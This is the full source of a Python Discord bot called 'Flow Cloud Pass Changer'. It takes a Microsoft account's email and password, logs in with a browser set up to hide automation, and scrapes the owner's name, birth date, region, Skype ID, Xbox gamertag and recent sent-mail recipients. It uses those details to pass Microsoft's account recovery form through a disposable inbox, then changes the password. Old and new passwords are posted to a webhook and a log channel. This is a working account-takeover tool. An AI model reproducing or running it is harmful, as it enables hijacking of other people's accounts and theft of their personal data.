#!/usr/bin/env python3

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import requests
import random
import string
import time
import re
import json
import os
import platform
from io import BytesIO
from datetime import datetime
from PIL import Image
import pycountry
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=".", intents=intents)

LOG_CHANNEL = None
CONFIG = {"webhook_url": "", "log_channel": None}

def load_config():
    if os.path.exists("config.json"):
        with open("config.json") as f:
            return json.load(f)
    return {"webhook_url": "", "log_channel": None}

def save_config():
    with open("config.json", "w") as f:
        json.dump(CONFIG, f)

async def log_message(message: str):
    global LOG_CHANNEL
    if LOG_CHANNEL:
        try:
            embed = discord.Embed(description=message, color=discord.Color.blue())
            embed.set_footer(text="Flow Cloud Pass Changer By SeriesV2")
            await LOG_CHANNEL.send(embed=embed)
        except:
            pass

def send_embed(title: str, description: str, color=None, fields=None):
    embed = discord.Embed(title=title, description=description, color=color or discord.Color.blue())
    if fields:
        for name, value in fields.items():
            embed.add_field(name=name, value=value, inline=True)
    embed.set_footer(text="Flow Cloud Pass Changer By SeriesV2")
    return embed

def generate_flowcloud_password() -> str:
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"FlowCloud{random_numbers}"

def random_name(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def get_domains():
    r = requests.get("https://api.mail.tm/domains")
    return r.json()['hydra:member'][0]['domain']

def register_account(email, password):
    payload = {"address": email, "password": password}
    r = requests.post("https://api.mail.tm/accounts", json=payload)
    return r.status_code in [201, 422]

def get_token(email, password):
    payload = {"address": email, "password": password}
    r = requests.post("https://api.mail.tm/token", json=payload)
    return r.json()['token']

def get_messages(token):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get("https://api.mail.tm/messages", headers=headers)
    return r.json().get('hydra:member', [])

def read_message(token, message_id):
    headers = {"Authorization": f"Bearer {token}"}
    r = requests.get(f"https://api.mail.tm/messages/{message_id}", headers=headers)
    return r.json()

def generate_temp_mail_account():
    username = random_name()
    password = random_name(12)
    domain = get_domains()
    email = f"{username}@{domain}"
    register_account(email, password)
    token = get_token(email, password)
    return email, password, token

def wait_for_emails(token, expected_count=2, timeout=90, interval=5):
    attempts = timeout // interval
    for _ in range(attempts):
        inbox = get_messages(token)
        if len(inbox) >= expected_count:
            return inbox[:expected_count]
        time.sleep(interval)
    return get_messages(token)

def extract_otp(text):
    match = re.search(r'\b\d{6}\b', text)
    return match.group(0) if match else None

def get_otp_from_first_email(token):
    emails = wait_for_emails(token, expected_count=1)
    if not emails:
        return None
    msg = read_message(token, emails[0]['id'])
    otp = extract_otp(msg['text'])
    return otp

def extract_specific_link(text):
    """Extract password reset link from Microsoft email - handles multiple formats"""
    if not text:
        return None
    
    lines = text.splitlines()
    
    # Pattern 1: Traditional "Click this link to reset your password:"
    for i, line in enumerate(lines):
        if "reset your password" in line.lower() or "reset password" in line.lower():
            for j in range(i + 1, min(i + 5, len(lines))):
                next_line = lines[j].strip()
                if next_line.startswith("http"):
                    return next_line
    
    # Pattern 2: Direct link in message (newer format)
    for line in lines:
        line = line.strip()
        if line.startswith("https://") and ("resetpassword" in line.lower() or "acsr" in line.lower() or "account.live.com" in line):
            return line
    
    # Pattern 3: Look for any password reset link with common Microsoft domains
    for line in lines:
        line = line.strip()
        if line.startswith("http") and ("account.microsoft.com" in line or "account.live.com" in line) and ("reset" in line.lower() or "recover" in line.lower()):
            return line
    
    # Pattern 4: Extract from text like "[LINK] https://..."
    import re
    url_pattern = r'(https?://[^\s\)>\]]+(?:account\.(?:microsoft|live)\.com)[^\s\)>\]]*)'
    matches = re.findall(url_pattern, text)
    for match in matches:
        if "reset" in match.lower() or "recover" in match.lower() or "acsr" in match.lower():
            return match
    
    # Pattern 5: Any account.microsoft.com/account... link as last resort
    matches = re.findall(url_pattern, text)
    if matches:
        return matches[0]
    
    return None

def create_driver(headless=True):
    options = Options()
    if headless:
        options.add_argument("--headless=new")
    else:
        options.add_argument("--start-minimized")
    
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1920,1080")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--incognito")
    options.add_argument("--disable-webauthn")
    options.add_argument("--disable-features=WebAuthentication,WebAuthn")
    
    system = platform.system().lower()
    if system == 'linux':
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    else:
        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"
    
    options.add_argument(f"user-agent={user_agent}")
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    
    chrome_paths = [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable", 
        "/usr/bin/chromium-browser",
        "/usr/bin/chromium",
        "/opt/google/chrome/chrome",
        "/snap/bin/chromium"
    ]
    
    for chrome_path in chrome_paths:
        if os.path.exists(chrome_path):
            options.binary_location = chrome_path
            break

    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
    except:
        driver = webdriver.Chrome(options=options)
    
    try:
        driver.execute_cdp_cmd(
            'Page.addScriptToEvaluateOnNewDocument',
            {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.navigator.chrome = { runtime: {} };
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            }
        )
    except:
        pass
    
    return driver

def download_captcha(driver) -> BytesIO:
    try:
        captcha_img = driver.find_element(By.XPATH, '//img[contains(@src, "GetHIPData")]')
        src = captcha_img.get_attribute("src")
        response = requests.get(src)
        img = Image.open(BytesIO(response.content))
        buf = BytesIO()
        img.save(buf, format='PNG')
        buf.seek(0)
        return buf
    except:
        return None

def scrape_outlook_emails(driver):
    """Scrape last 4 sent emails from Outlook with addresses and subjects"""
    try:
        driver.get("https://outlook.live.com")
        time.sleep(3)
        
        sent_addresses = []
        sent_subjects = []
        
        try:
            sent_folder = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Sent')]"))
            )
            sent_folder.click()
            time.sleep(2)
        except:
            return {"addresses": [], "subjects": []}
        
        try:
            email_items = driver.find_elements(By.XPATH, "//div[@role='button' and contains(@class, 'item')]")[:4]
            
            for item in email_items:
                try:
                    to_elem = item.find_element(By.XPATH, ".//span[@title]")
                    address = to_elem.get_attribute("title")
                    if address:
                        sent_addresses.append(address.split(";")[0].strip())
                except:
                    pass
                
                try:
                    subj_elem = item.find_element(By.XPATH, ".//div[@class='_3LGb5']")
                    subject = subj_elem.text
                    if subject:
                        sent_subjects.append(subject[:50])
                except:
                    pass
            
            return {
                "addresses": sent_addresses[:4],
                "subjects": sent_subjects[:4]
            }
        except:
            return {"addresses": [], "subjects": []}
    except:
        return {"addresses": [], "subjects": []}

all_countries = {country.name for country in pycountry.countries}

def scrape_account_info(email: str, password: str) -> dict:
    driver = create_driver()
    wait = WebDriverWait(driver, 20)
    try:
        driver.get("https://login.live.com")
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        time.sleep(2)
        
        password_input = None
        try:
            password_input = WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.NAME, "passwd"))
            )
        except TimeoutException:
            try:
                use_password_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                )
                use_password_btn.click()
                password_input = WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                try:
                    other_ways_btn = WebDriverWait(driver, 3).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Other ways to sign in')]"))
                    )
                    other_ways_btn.click()
                    time.sleep(1)
                    use_password_btn = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                    )
                    use_password_btn.click()
                    password_input = WebDriverWait(driver, 5).until(
                        EC.presence_of_element_located((By.NAME, "passwd"))
                    )
                except TimeoutException:
                    try:
                        switch_link = WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.ID, "idA_PWD_SwitchToCredPicker"))
                        )
                        switch_link.click()
                        time.sleep(1)
                        use_password_btn = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                        )
                        use_password_btn.click()
                        password_input = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.NAME, "passwd"))
                        )
                    except TimeoutException:
                        return {"email": email, "error": "Could not reach password input"}
        
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)
        time.sleep(2)
        
        try:
            password_input = driver.find_element(By.ID, "passwordEntry")
            if password_input.is_displayed():
                return {"email": email, "error": "Incorrect password"}
        except:
            pass
        
        try:
            if "Too Many Requests" in driver.page_source:
                retries = 0
                max_retries = 20
                while "Too Many Requests" in driver.page_source and retries < max_retries:
                    time.sleep(1)
                    driver.refresh()
                    retries += 1
                if "Too Many Requests" in driver.page_source:
                    return {"email": email, "error": "Too Many Requests"}
        except:
            pass
        
        try:
            security_next_btn = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.ID, "iLandingViewAction"))
            )
            security_next_btn.click()
            time.sleep(2)
        except:
            pass
        
        try:
            stay_signed_in_yes = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'))
            )
            stay_signed_in_yes.click()
            time.sleep(2)
        except:
            pass
        
        try:
            close_button = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, '//button[@aria-label="Close"]'))
            )
            close_button.click()
            time.sleep(1)
        except:
            pass
        
        driver.get("https://account.microsoft.com/profile")
        time.sleep(2)
        driver.get("https://account.microsoft.com/profile")
        try:
            wait.until(EC.presence_of_element_located((By.ID, "profile.profile-page.personal-section.full-name")))
            name = driver.find_element(By.ID, "profile.profile-page.personal-section.full-name").text.strip()
            spans = driver.find_elements(By.CSS_SELECTOR, 'span.fui-Text')
            dob = "DOB not found"
            region = "Region not found"
            
            for span in spans:
                text = span.text.strip()
                if "/" in text and len(text.split("/")) == 3:
                    parts = text.split(";")
                    for part in parts:
                        part = part.strip()
                        if "/" in part and len(part.split("/")) == 3:
                            dob = part
                            break
                elif text in all_countries:
                    region = text
        except:
            return {"email": email, "error": "Couldn't get account info"}
        
        driver.get("https://secure.skype.com/portal/profile")
        time.sleep(3)
        
        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip()
        except:
            skype_id = "live:"
        
        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip()
        except:
            skype_email = email
        
        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)
        
        gamertag = "Not found"
        
        try:
            try:
                sign_in_btn = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
                sign_in_btn.click()
                time.sleep(7)
            except:
                pass
            
            try:
                account_btn = WebDriverWait(driver, 6).until(
                    EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
                )
                account_btn.click()
                WebDriverWait(driver, 15).until(EC.url_contains("/play/user/"))
            except:
                pass
            
            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1]
                gamertag = gamertag.replace("%20", " ").replace("%25", "%")
        except:
            gamertag = "Error"
        
        outlook_data = scrape_outlook_emails(driver)
        
        return {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag,
            "outlook_addresses": outlook_data.get("addresses", []),
            "outlook_subjects": outlook_data.get("subjects", [])
        }
    except:
        return {"error": "Could Not Login!"}
    finally:
        driver.quit()

def submit_acsr_form(account_info: dict):
    email = account_info['email']
    
    tempmail, temp_pass, token = generate_temp_mail_account()
    
    driver = create_driver()
    wait = WebDriverWait(driver, 20)
    
    try:
        driver.get("https://account.live.com/acsr")
        time.sleep(2)
        
        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        
        tempmail_input = wait.until(EC.presence_of_element_located((By.ID, "iCMailInput")))
        tempmail_input.clear()
        tempmail_input.send_keys(tempmail)
        
        captcha_image = download_captcha(driver)
        
        return captcha_image, driver, token, tempmail
    except Exception as e:
        driver.quit()
        return None, None, None, None

def get_month_name(date_str):
    try:
        date_obj = datetime.strptime(date_str, "%m/%d/%Y")
        month_name = date_obj.strftime("%B")
        day = str(date_obj.day)
        year = str(date_obj.year)
        return month_name, day, year
    except ValueError:
        return "May", "5", "1989"

def continue_acsr_flow(driver, account_info, token, captcha_text, user_id):
    wait = WebDriverWait(driver, 20)
    
    try:
        captcha_value = captcha_text
        
        try:
            captcha_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.XPATH, '//input[contains(@id, "SolutionElement")]'))
            )
            captcha_input.clear()
            captcha_input.send_keys(captcha_value)
            captcha_input.send_keys(Keys.RETURN)
            
            code_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "iOttText"))
            )
        except Exception:
            captcha_image = download_captcha(driver)
            if captcha_image:
                return "CAPTCHA_RETRY_NEEDED"
            return "CAPTCHA_DOWNLOAD_FAILED"
        
        otp = get_otp_from_first_email(token)
        if not otp:
            return "OTP not received."
        
        code_input = wait.until(EC.presence_of_element_located((By.ID, "iOttText")))
        code_input.clear()
        code_input.send_keys(otp)
        code_input.send_keys(Keys.RETURN)
        time.sleep(2)
        
        first, last = account_info['name'].split(maxsplit=1) if ' ' in account_info['name'] else (account_info['name'], "Last")
        wait.until(EC.presence_of_element_located((By.ID, "FirstNameInput"))).send_keys(first)
        wait.until(EC.presence_of_element_located((By.ID, "LastNameInput"))).send_keys(last)
        
        month, day, year = get_month_name(account_info['dob'])
        
        if not all([month, day, year]):
            raise ValueError("Invalid or missing DOB")
        
        day_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_dayInput"))
        )
        Select(day_element).select_by_visible_text(day)
        
        month_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_monthInput"))
        )
        Select(month_element).select_by_visible_text(month)
        
        year_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "BirthDate_yearInput"))
        )
        Select(year_element).select_by_visible_text(year)
        
        wait.until(EC.presence_of_element_located((By.ID, "CountryInput"))).send_keys(account_info['region'])
        time.sleep(1)
        
        first_name_input = driver.find_element(By.ID, "FirstNameInput")
        first_name_input.send_keys(Keys.RETURN)
        time.sleep(1)
        
        previous_pass_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]'))
        )
        previous_pass_input.clear()
        previous_pass_input.send_keys(account_info["password"])
        time.sleep(2)
        
        skype_checkbox = driver.find_element(By.ID, "ProductOptionSkype")
        if not skype_checkbox.is_selected():
            skype_checkbox.click()
        
        xbox_checkbox = driver.find_element(By.ID, "ProductOptionXbox")
        if not xbox_checkbox.is_selected():
            xbox_checkbox.click()
        
        try:
            outlook_checkbox = driver.find_element(By.ID, "ProductOptionOutlook")
            if not outlook_checkbox.is_selected():
                outlook_checkbox.click()
        except:
            pass
        
        previous_pass_input.send_keys(Keys.RETURN)
        time.sleep(1)
        
        try:
            skype_name_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "SkypeNameInput"))
            )
            skype_name_input.clear()
            skype_name_input.send_keys(account_info["skype_id"])
            
            skype_email_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "SkypeAccountCreateEmailInput"))
            )
            skype_email_input.clear()
            skype_email_input.send_keys(account_info["skype_email"])
            time.sleep(2)
            skype_email_input.send_keys(Keys.RETURN)
        except:
            pass
        
        time.sleep(1)
        
        try:
            xbox_radio = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "XboxOneOption"))
            )
            if not xbox_radio.is_selected():
                xbox_radio.click()
            xbox_radio.send_keys(Keys.ENTER)
            time.sleep(2)
            
            xbox_name_input = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "XboxGamertagInput"))
            )
            xbox_name_input.clear()
            xbox_name_input.send_keys(account_info["gamertag"])
            xbox_name_input.send_keys(Keys.RETURN)
        except:
            pass
        
        time.sleep(1)
        
        try:
            outlook_addresses = account_info.get("outlook_addresses", [])
            outlook_subjects = account_info.get("outlook_subjects", [])
            
            if outlook_addresses:
                outlook_email_input = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "OutlookEmailInput"))
                )
                outlook_email_input.clear()
                outlook_email_input.send_keys(outlook_addresses[0] if outlook_addresses else "")
                
                if len(outlook_addresses) > 1:
                    outlook_email_2_input = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.ID, "OutlookEmail2Input"))
                    )
                    outlook_email_2_input.clear()
                    outlook_email_2_input.send_keys(outlook_addresses[1])
                
                time.sleep(2)
                outlook_email_input.send_keys(Keys.RETURN)
        except:
            pass
        
        try:
            time.sleep(90)
            emails = wait_for_emails(token, expected_count=2, timeout=120)
            
            resetlink = None
            for email in emails:
                email_data = read_message(token, email['id'])
                extracted_link = extract_specific_link(email_data['text'])
                if extracted_link:
                    resetlink = extracted_link
                    break
            
            try:
                driver.quit()
            except:
                pass
            
            if resetlink:
                return resetlink
            return None
        except Exception as e:
            return None
    except Exception as e:
        return None

def perform_password_reset(resetlink, email, new_password):
    driver = create_driver()
    wait = WebDriverWait(driver, 25)
    try:
        driver.get(resetlink)
        
        email_input = wait.until(EC.presence_of_element_located((By.ID, "AccountNameInput")))
        email_input.clear()
        email_input.send_keys(email)
        email_input.send_keys(Keys.RETURN)
        
        new_pass = wait.until(EC.presence_of_element_located((By.ID, "iPassword")))
        new_pass.clear()
        new_pass.send_keys(new_password)
        
        new_pass_re = wait.until(EC.presence_of_element_located((By.ID, "iRetypePassword")))
        new_pass_re.clear()
        new_pass_re.send_keys(new_password)
        time.sleep(1)
        new_pass_re.send_keys(Keys.RETURN)
        
        time.sleep(5)
        
        try:
            driver.find_element(By.CSS_SELECTOR, 'input[data-nuid="PreviousPasswordInput"]')
            fallback_pass = "SladePass!12"
            pass_input = driver.find_element(By.ID, "iPassword")
            pass_input.clear()
            pass_input.send_keys(fallback_pass)
            retype_input = driver.find_element(By.ID, "iRetypePassword")
            retype_input.clear()
            retype_input.send_keys(fallback_pass)
            retype_input.send_keys(Keys.RETURN)
            return fallback_pass
        except:
            return new_password
    except Exception as e:
        pass
    finally:
        driver.quit()

def send_webhook(data, webhook_url):
    try:
        if not webhook_url:
            return
        embeds = []
        for item in data:
            fields = []
            for k, v in item.items():
                if v:
                    fields.append({"name": k, "value": str(v)[:1024], "inline": True})
            embeds.append({
                "title": "Flow Cloud Account Processed",
                "color": 65280 if item.get("success") else 16711680,
                "fields": fields
            })
        requests.post(webhook_url, json={"username": "Flow Cloud Bot", "embeds": embeds})
    except:
        pass

@bot.event
async def on_ready():
    global LOG_CHANNEL
    await bot.change_presence(status=discord.Status.dnd, activity=discord.Game(name="Flow Cloud Pass Changer"))
    print(f"Bot ready as {bot.user}")

@bot.command(name="set-log")
async def set_log(ctx, channel: discord.TextChannel):
    global LOG_CHANNEL, CONFIG
    LOG_CHANNEL = channel
    CONFIG["log_channel"] = channel.id
    save_config()
    embed = send_embed("Log Channel Set", f"Logs will be sent to {channel.mention}", discord.Color.green())
    await ctx.send(embed=embed)

@bot.command(name="recover")
async def recover(ctx, credentials: str):
    if ":" not in credentials:
        embed = send_embed("Error", "Format: .recover email:password", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    email, password = credentials.split(":", 1)
    
    embed = send_embed("Password Recovery", f"Choose password option:\n1. **Generate** - Auto-generate password\n2. **Custom** - Enter custom password", discord.Color.blue())
    msg = await ctx.send(embed=embed)
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel
    
    try:
        response = await bot.wait_for("message", check=check, timeout=30)
        choice = response.content.lower()
    except asyncio.TimeoutError:
        embed = send_embed("Timeout", "Command timed out", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    new_password = None
    if choice == "generate":
        new_password = generate_flowcloud_password()
        embed = send_embed("Password Generated", f"Generated: `{new_password}`", discord.Color.green())
        await ctx.send(embed=embed)
        await log_message(f"Generated password for {email}: {new_password}")
    elif choice == "custom":
        embed = send_embed("Custom Password", "Enter your custom password:", discord.Color.blue())
        await ctx.send(embed=embed)
        try:
            pass_response = await bot.wait_for("message", check=check, timeout=30)
            new_password = pass_response.content
            embed = send_embed("Password Set", f"Custom password set: `{new_password}`", discord.Color.green())
            await ctx.send(embed=embed)
            await log_message(f"Custom password set for {email}: {new_password}")
        except asyncio.TimeoutError:
            embed = send_embed("Timeout", "Command timed out", discord.Color.red())
            await ctx.send(embed=embed)
            return
    else:
        embed = send_embed("Invalid Choice", "Please reply with 'generate' or 'custom'", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    embed = send_embed("Recovery Started", f"Starting recovery for `{email}`", discord.Color.blue())
    await ctx.send(embed=embed)
    await log_message(f"Starting recovery for {email}")
    
    embed = send_embed("Scraping", "Scraping account information...", discord.Color.blue())
    msg = await ctx.send(embed=embed)
    
    account_info = scrape_account_info(email, password)
    if account_info.get("error"):
        embed = send_embed("Error", f"Failed: {account_info['error']}", discord.Color.red())
        await ctx.send(embed=embed)
        await log_message(f"Error scraping {email}: {account_info['error']}")
        return
    
    embed = send_embed("Account Info Scraped", "Submitting ACSR form...", discord.Color.green())
    await msg.edit(embed=embed)
    await log_message(f"Account info scraped for {email}")
    
    captcha_img, driver, token, tempmail = submit_acsr_form(account_info)
    if not captcha_img:
        embed = send_embed("Error", "Failed at ACSR submission", discord.Color.red())
        await ctx.send(embed=embed)
        await log_message(f"ACSR submission failed for {email}")
        return
    
    embed = send_embed("CAPTCHA Required", "Complete this CAPTCHA", discord.Color.blue())
    await ctx.send(embed=embed, file=discord.File(captcha_img, "captcha.png"))
    await log_message(f"CAPTCHA sent for {email}")
    
    try:
        captcha_response = await bot.wait_for("message", check=check, timeout=120)
        captcha_solution = captcha_response.content.strip()
    except asyncio.TimeoutError:
        embed = send_embed("Timeout", "CAPTCHA timeout", discord.Color.red())
        await ctx.send(embed=embed)
        return
    
    await log_message(f"CAPTCHA answer received for {email}: {captcha_solution}")
    
    embed = send_embed("Processing", "Processing ACSR flow...", discord.Color.blue())
    msg = await ctx.send(embed=embed)
    
    reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
    
    retry_count = 0
    while reset_link == "CAPTCHA_RETRY_NEEDED" and retry_count < 3:
        retry_count += 1
        embed = send_embed("Wrong CAPTCHA", f"Retry {retry_count}/3", discord.Color.orange())
        await ctx.send(embed=embed)
        
        captcha_img = download_captcha(driver)
        if captcha_img:
            embed = send_embed("New CAPTCHA", "Complete this CAPTCHA", discord.Color.blue())
            await ctx.send(embed=embed, file=discord.File(captcha_img, f"captcha_retry_{retry_count}.png"))
        
        try:
            captcha_response = await bot.wait_for("message", check=check, timeout=120)
            captcha_solution = captcha_response.content.strip()
        except asyncio.TimeoutError:
            embed = send_embed("Timeout", "CAPTCHA timeout", discord.Color.red())
            await ctx.send(embed=embed)
            return
        
        reset_link = continue_acsr_flow(driver, account_info, token, captcha_solution, str(ctx.author.id))
    
    if not reset_link or reset_link in ["CAPTCHA_RETRY_NEEDED", "OTP not received.", "CAPTCHA_DOWNLOAD_FAILED"]:
        embed = send_embed("Error", f"Failed to get reset link: {reset_link}", discord.Color.red())
        await ctx.send(embed=embed)
        await log_message(f"Failed to get reset link for {email}: {reset_link}")
        return
    
    embed = send_embed("Resetting", "Resetting password...", discord.Color.blue())
    await msg.edit(embed=embed)
    
    updated_password = perform_password_reset(reset_link, email, new_password)
    
    result = {
        "email": email,
        "old_password": password,
        "new_password": updated_password,
        "name": account_info.get('name', 'N/A'),
        "dob": account_info.get('dob', 'N/A'),
        "region": account_info.get('region', 'N/A'),
        "skype_id": account_info.get('skype_id', 'N/A'),
        "skype_email": account_info.get('skype_email', 'N/A'),
        "gamertag": account_info.get('gamertag', 'N/A'),
        "success": True
    }
    
    if CONFIG["webhook_url"]:
        send_webhook([result], CONFIG["webhook_url"])
    
    fields = {
        "Email": email,
        "Old Password": password[:5] + "***",
        "New Password": updated_password[:5] + "***",
        "Name": result["name"],
        "Gamertag": result["gamertag"]
    }
    embed = send_embed("Recovery Complete", "Password successfully changed!", discord.Color.green(), fields)
    await ctx.send(embed=embed)
    await log_message(f"Recovery complete for {email} - new password: {updated_password}")

@bot.command(name="set-webhook")
async def set_webhook(ctx, webhook_url: str):
    global CONFIG
    CONFIG["webhook_url"] = webhook_url
    save_config()
    embed = send_embed("Webhook Set", "Webhook URL saved", discord.Color.green())
    await ctx.send(embed=embed)

TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    print("DISCORD_TOKEN not set")
else:
    CONFIG = load_config()
    bot.run(TOKEN)
